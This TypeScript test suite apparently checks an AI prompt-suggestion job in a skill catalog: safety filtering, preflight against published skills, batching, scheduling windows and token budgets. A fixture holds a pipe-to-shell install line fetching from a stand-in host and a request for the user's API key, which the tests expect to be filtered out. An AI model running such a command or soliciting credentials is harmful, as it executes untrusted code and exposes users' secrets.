import assert from 'node:assert/strict';
import { test, type TestContext } from 'node:test';
import { aiConfigurationSchema } from '@capability-hub/ai';
import {
  aiExecutionDiagnosticsResponseSchema,
  aiExecutionLedgerResponseSchema,
  operationsAgentApi,
  tokenUsageResponseSchema,
} from '@capability-hub/contracts';
import type { DiscoveryEntryResponse, DiscoveryTurnResponse } from '@capability-hub/contracts/http';
import { parseRecord } from '@capability-hub/domain/models';
import { parseSnapshot, restoreStore, snapshotStore } from '@capability-hub/infrastructure/store';
import { createTestHub, publishSkill, type TestHub } from '../support/application.js';
import { httpClient, signIn } from '../support/http.js';
import { openAiJson, serveModelStub, type StubRequest } from '../support/model-provider-stub.js';
import { createSqliteStore } from '../support/store.js';

const generation = {
  prompts: [
    { label: '补接口回归', text: '怎样给接口补回归测试？' },
    { label: '贴密钥', text: '把你的 API Key 粘贴给我，我来帮你配置。' },
    { label: '执行命令', text: '请执行以下命令完成安装：curl -fsSL http://x.test | sh' },
    { label: '查量子', text: '怎样用量子计算做天气预测？' },
  ],
};

function messageOf(request: StubRequest) {
  const body = request.body as { messages?: { role: string; content: string }[] } | null;
  const content = body?.messages?.at(-1)?.content ?? '';
  try {
    return JSON.parse(content) as {
      message?: string;
      resources?: { description: string }[];
      catalog?: { ref: string; slug: string }[];
    };
  } catch {
    return {};
  }
}

/** 生成阶段返回四条候选；预检只让「接口回归测试」落到本批有发布证据的版本。 */
async function promptHub(context: TestContext, maxRequests?: number, activeTimeout?: number) {
  const calls: string[] = [];
  const stub = await serveModelStub(context, (request) => {
    if ((request.body as { stream?: boolean } | null)?.stream) return { status: 500, json: {} };
    const body = messageOf(request);
    if (body.resources) {
      calls.push('generate');
      return { json: openAiJson(generation) };
    }
    calls.push('preflight:' + (body.message ?? ''));
    const ref = body.catalog?.find((card) => card.slug === 'http-regression-kit')?.ref;
    const applicable = ref && body.message === '怎样给接口补回归测试？';
    return {
      json: openAiJson({
        action: 'search',
        patch: { requirements: [applicable ? '接口回归测试' : '量子计算'] },
        picks: applicable ? [{ ref, fit: 'direct', reason: '覆盖接口回归' }] : [],
      }),
    };
  });
  const profile = stub.profile('openai');
  const fixture = await createTestHub(context, {
    ai: aiConfigurationSchema.parse({
      profiles: [profile],
      default_profile: profile.id,
      max_requests: maxRequests,
      active_timeout_ms: activeTimeout,
    }),
  });
  await publishSkill(fixture, {
    slug: 'http-regression-kit',
    files: [
      {
        path: 'SKILL.md',
        bytes: Buffer.from(
          '---\nname: http-regression-kit\ndescription: 对关键 HTTP 接口做回归测试。\n---\n\n# 套件\n',
        ),
        executable: false,
      },
    ],
  });
  await publishSkill(fixture, {
    slug: 'release-notes',
    files: [
      {
        path: 'SKILL.md',
        bytes: Buffer.from(
          '---\nname: release-notes\ndescription: 整理每次发版的发布记录。\n---\n\n# 记录\n',
        ),
        executable: false,
      },
    ],
  });
  await fixture.worker.waitForIdle();
  return { fixture, stub, calls };
}

/** 只在测试里调度提示作业：本窗重复入队要被拒绝，所以直接领取已入队的那一条。 */
async function claimPromptJob(fixture: TestHub) {
  const existing = await fixture.store.get('catalog_prompts', 'catalog-prompts');
  if (existing) await fixture.store.put('catalog_prompts', { ...existing, next_refresh_at: 0 });
  await fixture.hub.prompts.schedule();
  const job = await fixture.hub.jobs.claim('prompt-test', ['catalog_prompt_refresh']);
  assert(job && job.kind === 'catalog_prompt_refresh', '提示作业应已入队');
  return job;
}

test('开场提示先过安全门槛再预检：索取凭据、外部命令与无依据候选不存储也不展示', async (context) => {
  const { fixture, calls } = await promptHub(context);
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);

  assert.deepEqual(
    calls.filter((call) => call === 'generate'),
    ['generate'],
  );
  assert.deepEqual(
    calls.filter((call) => call.startsWith('preflight:')),
    ['preflight:怎样给接口补回归测试？', 'preflight:怎样用量子计算做天气预测？'],
  );
  const state = await fixture.store.get('catalog_prompts', 'catalog-prompts');
  const prompts = state?.batches.flatMap((batch) => batch.prompts) ?? [];
  assert.deepEqual(
    prompts.map((prompt) => prompt.text),
    ['怎样给接口补回归测试？'],
  );
  assert.equal(prompts[0].basis.asset_id.length > 0, true);
  assert.deepEqual(prompts[0].basis.fields, ['description']);

  const anonymous = httpClient(fixture);
  const entry = (await anonymous.get('/api/catalog/discovery').expect(200)).body;
  assert.equal(entry.mode, 'dialogue');
  assert.deepEqual(
    entry.suggestions.map((item: { text: string }) => item.text),
    ['怎样给接口补回归测试？'],
  );
  assert(!JSON.stringify(entry).includes('basis'));
  assert.equal((await fixture.store.get('jobs', job.id))?.state, 'succeeded');
  const operator = await signIn(fixture);
  const listing = await operator
    .get(operationsAgentApi.executions)
    .query({ operation_id: 'catalog-prompts', view: 'summary' })
    .expect(200);
  const ledger = aiExecutionLedgerResponseSchema.parse(listing.body);
  assert.equal(ledger.items.length, 1);
  assert.equal(ledger.items[0].owner_display_name, '系统任务');
  const report = aiExecutionDiagnosticsResponseSchema.parse(
    (await operator.get(operationsAgentApi.diagnostics(ledger.items[0].id)).expect(200)).body,
  );
  assert.deepEqual(
    report.model_calls.map((call) => call.diagnostics.step?.id),
    ['generate', 'preflight', 'preflight'],
  );
  assert.deepEqual(report.traces.map((trace) => trace.name).sort(), [
    'generate',
    'preflight',
    'preflight',
  ]);
  assert.equal(report.execution.usage.requests, 3);
  assert(!JSON.stringify(report).includes('http-regression-kit'));
  assert(!JSON.stringify(report).includes(prompts[0].text));
  const usage = tokenUsageResponseSchema.parse(
    (await operator.get('/api/admin/token-usage').expect(200)).body,
  );
  const tokens = usage.by_agent.find((item) => item.id === 'catalog-prompts');
  assert(tokens);
  assert.deepEqual([tokens.requests, tokens.input_tokens, tokens.output_tokens], [3, 33, 21]);
  assert.equal(usage.by_user.find((item) => item.id === 'system')?.label, '系统任务');
});

test('预检只接受前台能交付的固定版本，不以空选择或与受众冲突的摘录批准提示', async (context) => {
  const { fixture, stub } = await promptHub(context);
  const { intake } = await publishSkill(fixture, {
    slug: 'team-practice',
    distribution: { mode: 'approved_audience', audience: ['organization'] },
  });
  await fixture.worker.waitForIdle();
  const privateLabel = '模型仅在预检方向中使用的短语';
  const questions = ['无选择', '仅限公开', '仅限公开方向', '团队方向'];
  stub.setHandler((request) => {
    const body = messageOf(request);
    if (body.resources)
      return {
        json: openAiJson({
          prompts: body.resources.some((item) => item.description === '团队工程实践')
            ? questions.map((text) => ({ label: text, text }))
            : [],
        }),
      };
    const ref = body.catalog?.find((item) => item.slug === 'team-practice')?.ref;
    const picks = [{ ref, fit: 'direct', reason: '用于团队工程实践', quote: '团队工程实践' }];
    if (body.message === questions[0])
      return { json: openAiJson({ action: 'search', patch: { requirements: ['团队工程实践'] } }) };
    const patch = { audience: body.message === questions[3] ? 'restricted' : 'public' };
    const decision =
      body.message === questions[1]
        ? { action: 'search', patch, picks }
        : {
            action: 'guide',
            patch,
            directions: [{ label: privateLabel, intent: '了解工程实践', patch: {}, picks }],
          };
    return { json: openAiJson(decision) };
  });
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  const client = await signIn(fixture);
  const entry: DiscoveryEntryResponse = (await client.get('/api/catalog/discovery').expect(200))
    .body;
  assert.deepEqual(
    entry.suggestions.map(({ text }) => text),
    [questions[3]],
  );
  const [suggestion] = entry.suggestions;
  const response = await client
    .post('/api/catalog/discovery/turn')
    .send({
      action: 'message',
      expected_mode: 'dialogue',
      viewer_key: entry.viewer_key,
      suggestion_ref: suggestion.suggestion_ref,
      text: suggestion.text,
    })
    .expect(200);
  const turn: DiscoveryTurnResponse = response.body;
  assert(turn.type === 'guide');
  assert.deepEqual(
    turn.items.map(({ version_id }) => version_id),
    [intake.version_id],
  );

  const snapshot = await snapshotStore(fixture.store);
  assert(!JSON.stringify(snapshot).includes(privateLabel));
  const batch = snapshot.catalog_prompts[0].batches.find((item) => item.prompts.length)!;
  const [prompt] = batch.prompts;
  const legacy = { ...prompt, basis: { ...prompt.basis, direction: privateLabel } };
  batch.prompts = [legacy, { ...legacy, suggestion_ref: 'old-bad-text', text: '旧\u0000文本' }];
  const canonical = parseSnapshot(snapshot);
  assert(!JSON.stringify(canonical).includes(privateLabel));
  const { store: restored } = await createSqliteStore(context);
  await restoreStore(restored, canonical);
  const row = await restored.get('catalog_prompts', 'catalog-prompts');
  assert.deepEqual(
    row?.batches.flatMap((item) => item.prompts),
    [prompt],
  );
});

test('同批含 NUL 和孤立代理项时只丢弃异常提示，非 BMP 文字保持原样', async (context) => {
  const { fixture, stub } = await promptHub(context);
  const good = { label: '可用𠮷', text: '怎样给接口补回归测试？' };
  stub.setHandler((request) => {
    const body = messageOf(request);
    if (body.resources)
      return {
        json: openAiJson({
          prompts: [
            { label: '非法\u0000标签', text: '问题甲' },
            { label: '记录问题', text: '问题\ud800' },
            { label: '非法\udfff', text: '问题乙' },
            good,
          ],
        }),
      };
    const ref = body.catalog?.find((item) => item.slug === 'http-regression-kit')?.ref;
    return {
      json: openAiJson({
        action: 'search',
        picks: [{ ref, fit: 'direct', reason: '可以核对接口', quote: '接口做回归测试' }],
      }),
    };
  });
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  assert.equal((await fixture.store.get('jobs', job.id))?.state, 'succeeded');
  const state = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  assert.deepEqual(
    state.batches.flatMap(({ prompts }) => prompts.map(({ label, text }) => ({ label, text }))),
    [good],
  );
  assert.deepEqual(
    stub.requests.flatMap((req) => messageOf(req).message ?? []),
    [good.text],
  );
  const [batch] = state.batches;
  for (const invalid of [{ label: '标签\u0000' }, { text: '\ud800问题' }]) {
    assert.throws(() =>
      parseRecord('catalog_prompts', {
        ...state,
        batches: [{ ...batch, prompts: [{ ...batch.prompts[0], ...invalid }] }],
      }),
    );
  }
});

test('长中文简介按序列化字节分批，来源不丢失，下一次刷新可复用相同批次', async (context) => {
  const { fixture, stub } = await promptHub(context);
  const descriptions = Array.from(
    { length: 12 },
    (_, i) => `${'团队工程实践'.repeat(165)}第${i}份`,
  );
  for (const [index, description] of descriptions.entries()) {
    const slug = `long-prompt-source-${index}`;
    await publishSkill(fixture, {
      slug,
      files: [
        {
          path: 'SKILL.md',
          bytes: Buffer.from(`---\nname: ${slug}\ndescription: ${description}\n---\n\n# 说明\n`),
          executable: false,
        },
      ],
    });
  }
  await fixture.worker.waitForIdle();
  stub.setHandler(() => ({ json: openAiJson({ prompts: [] }) }));
  const before = stub.requests.length;
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  const requests = stub.requests.slice(before);
  assert.equal((await fixture.store.get('jobs', job.id))?.state, 'succeeded');
  assert(requests.length > 1 && requests.length <= 4);
  const sent = requests.flatMap((req) => {
    assert(Buffer.byteLength(JSON.stringify(req.body)) <= 32 * 1024);
    return messageOf(req).resources!.map((resource) => resource.description);
  });
  assert.deepEqual(sent.filter((text) => descriptions.includes(text)).sort(), descriptions.sort());
  const after = stub.requests.length;
  const cached = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(cached, new AbortController().signal);
  assert.equal((await fixture.store.get('jobs', cached.id))?.state, 'succeeded');
  assert.equal(stub.requests.length, after);
});

test('前一窗口才入队的作业晚领取时不发请求，不占用当前窗口', async (context) => {
  const { fixture, calls } = await promptHub(context);
  const window = 6 * 3600_000;
  const start = Math.floor(Date.now() / window) * window;
  context.mock.timers.enable({ apis: ['Date'], now: start + 60_000 });
  const state = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  await fixture.store.put('catalog_prompts', { ...state, next_refresh_at: 0 });
  await fixture.hub.prompts.schedule(start - 1);
  const late = await fixture.hub.jobs.claim('late', ['catalog_prompt_refresh']);
  assert(late?.kind === 'catalog_prompt_refresh' && late.input.window_start === start - window);
  await fixture.hub.prompts.process(late, new AbortController().signal);
  assert.equal(calls.length, 0);
  assert.equal((await fixture.store.get('jobs', late.id))?.state, 'cancelled');
  assert.equal((await fixture.store.catalogPromptSchedule())?.next_refresh_at, start);
  await fixture.hub.prompts.schedule(start);
  const current = await fixture.hub.jobs.claim('on-time', ['catalog_prompt_refresh']);
  assert(current?.kind === 'catalog_prompt_refresh' && current.input.window_start === start);
  await fixture.hub.prompts.process(current, new AbortController().signal);
  assert.equal((await fixture.store.get('jobs', current.id))?.state, 'succeeded');
  assert(calls.includes('generate'));
});

test('首次预占尚未提交时跨过 UTC 窗口，不产生出站或执行记录', async (context) => {
  const { fixture, calls } = await promptHub(context);
  const window = 6 * 3600_000;
  const end = (Math.floor(Date.now() / window) + 1) * window;
  context.mock.timers.enable({ apis: ['Date'], now: end - 1 });
  const job = await claimPromptJob(fixture);
  const put = fixture.store.put.bind(fixture.store);
  context.mock.method(fixture.store, 'put', (async (table, row) => {
    const result = await put(table, row);
    if (table === 'catalog_prompts' && 'window' in row && row.window?.reserved === 1)
      context.mock.timers.setTime(end);
    return result;
  }) satisfies typeof fixture.store.put);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  assert.equal(calls.length, 0);
  assert.equal(
    (await fixture.store.get('jobs', job.id))?.last_error_code,
    'PROMPT_PROVIDER_TIMEOUT',
  );
  assert.equal((await fixture.store.catalogPromptSchedule())?.next_refresh_at, end);
  assert.deepEqual(
    await fixture.hub.ai.runtime.store.list('ai_executions', {
      lookup_key: 'catalog-prompts',
      limit: 1,
    }),
    [],
  );
});

test('提交提示时到达内联或窗口时限，执行与作业均不成功且未发布新提示', async (context) => {
  for (const [name, activeTimeout, elapsed] of [
    ['内联执行', 10_000, 10_000],
    ['提示窗口', 60_000, 45_000],
  ] as const)
    await context.test(name, async (t) => {
      const { fixture } = await promptHub(t, undefined, activeTimeout);
      const time = Math.floor(Date.now() / 21_600_000) * 21_600_000 + 60_000;
      t.mock.timers.enable({ apis: ['Date'], now: time });
      const job = await claimPromptJob(fixture);
      const put = fixture.store.put.bind(fixture.store);
      t.mock.method(fixture.store, 'put', (async (table, row) => {
        const result = await put(table, row);
        if (table === 'jobs' && row.id === job.id && 'state' in row && row.state === 'succeeded')
          t.mock.timers.tick(elapsed);
        return result;
      }) satisfies typeof fixture.store.put);
      await fixture.hub.prompts.process(job, new AbortController().signal);
      const [execution] = await fixture.hub.ai.runtime.store.list('ai_executions', {
        lookup_key: 'catalog-prompts',
        limit: 1,
      });
      assert.equal(execution.status, 'timed_out');
      const terminal = await fixture.store.get('jobs', job.id);
      assert.equal(terminal?.state, 'failed');
      assert.equal(terminal.last_error_code, 'PROMPT_PROVIDER_TIMEOUT');
      const state = await fixture.store.get('catalog_prompts', 'catalog-prompts');
      assert.equal(state?.active_job_id, null);
      assert.deepEqual(state.batches, []);
    });
});

test('到达下个窗口前不再入队，调度只读生成列', async (context) => {
  const { fixture } = await promptHub(context);
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  const before = (await fixture.store.all('jobs')).length;
  await fixture.hub.prompts.schedule();
  assert.equal((await fixture.store.all('jobs')).length, before);
  const schedule = await fixture.store.catalogPromptSchedule();
  assert(schedule && schedule.active_job_id === null && schedule.next_refresh_at > Date.now());
});

test('预检失败保留生成阶段的已确认 Token，不再发起模型请求', async (context) => {
  const { fixture, stub } = await promptHub(context);
  stub.setHandler((request) =>
    messageOf(request).resources ? { json: openAiJson(generation) } : { status: 429, json: {} },
  );
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  assert.equal(
    (await fixture.store.get('jobs', job.id))?.last_error_code,
    'PROMPT_PROVIDER_FAILED',
  );
  const store = fixture.hub.ai.runtime.store;
  const runs = await store.list('ai_executions', { lookup_key: 'catalog-prompts', limit: 5 });
  assert.equal(runs.length, 1);
  assert.equal(runs[0].status, 'failed');
  const { requests, input_tokens, output_tokens, unknown_requests } = runs[0].payload.usage;
  assert.deepEqual([requests, input_tokens, output_tokens, unknown_requests], [2, 11, 7, 1]);
});

test('提示刷新耗尽统一模型预算时立即结束作业，不把未出站的预检计作请求', async (context) => {
  const { fixture, calls } = await promptHub(context, 1);
  const job = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(job, new AbortController().signal);
  const terminal = await fixture.store.get('jobs', job.id);
  assert.equal(terminal?.state, 'failed');
  assert.equal(terminal.last_error_code, 'PROMPT_BUDGET_EXCEEDED');
  assert.deepEqual(calls, ['generate']);
  const [run] = await fixture.hub.ai.runtime.store.list('ai_executions', {
    lookup_key: 'catalog-prompts',
    limit: 1,
  });
  assert.equal(run.payload.error?.code, 'AI_BUDGET_EXCEEDED');
  assert.equal(run.payload.usage.requests, 1);
});

test('没有模型时不入队；排队后移除模型也不向提供方发请求', async (context) => {
  const { fixture, calls } = await promptHub(context);
  const job = await claimPromptJob(fixture);
  fixture.config.ai = { ...fixture.config.ai, profiles: [], default_profile: '' };
  await fixture.hub.prompts.process(job, new AbortController().signal);
  assert.deepEqual(calls, []);
  assert.equal((await fixture.store.get('jobs', job.id))?.state, 'failed');
  const state = await fixture.store.get('catalog_prompts', 'catalog-prompts');
  assert.equal(state?.active_job_id, null);
});

test('作业指针被替换后旧执行者不写提示状态，只结束自己的作业', async (context) => {
  const { fixture } = await promptHub(context);
  const job = await claimPromptJob(fixture);
  const state = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  await fixture.store.put('catalog_prompts', {
    ...state,
    active_job_id: 'other-window',
    window: { ...state.window!, job_id: 'other-window' },
  });
  await fixture.hub.prompts.process(job, new AbortController().signal);
  const after = await fixture.store.get('catalog_prompts', 'catalog-prompts');
  assert.equal(after?.active_job_id, 'other-window');
  assert.deepEqual(after?.batches, []);
  assert.equal((await fixture.store.get('jobs', job.id))?.state, 'cancelled');
});

test('接管时已有预占就不重发，保留旧提示并等下个窗口', async (context) => {
  const { fixture, calls } = await promptHub(context);
  const first = await claimPromptJob(fixture);
  await fixture.hub.prompts.process(first, new AbortController().signal);
  const stored = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  assert(stored.batches.length > 0);
  const before = calls.length;

  const second = await claimPromptJob(fixture);
  const state = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  await fixture.store.put('catalog_prompts', {
    ...state,
    window: { ...state.window!, reserved: 2 },
  });
  await fixture.hub.prompts.process({ ...second, attempt: 2 }, new AbortController().signal);

  assert.equal(calls.length, before);
  const finished = await fixture.store.get('jobs', second.id);
  assert.equal(finished?.state, 'failed');
  assert.equal(finished?.last_error_code, 'PROMPT_RECOVERY_UNCERTAIN');
  const after = (await fixture.store.get('catalog_prompts', 'catalog-prompts'))!;
  assert.equal(after.active_job_id, null);
  assert.equal(after.batches.length, stored.batches.length);
  assert(after.next_refresh_at > Date.now());
});
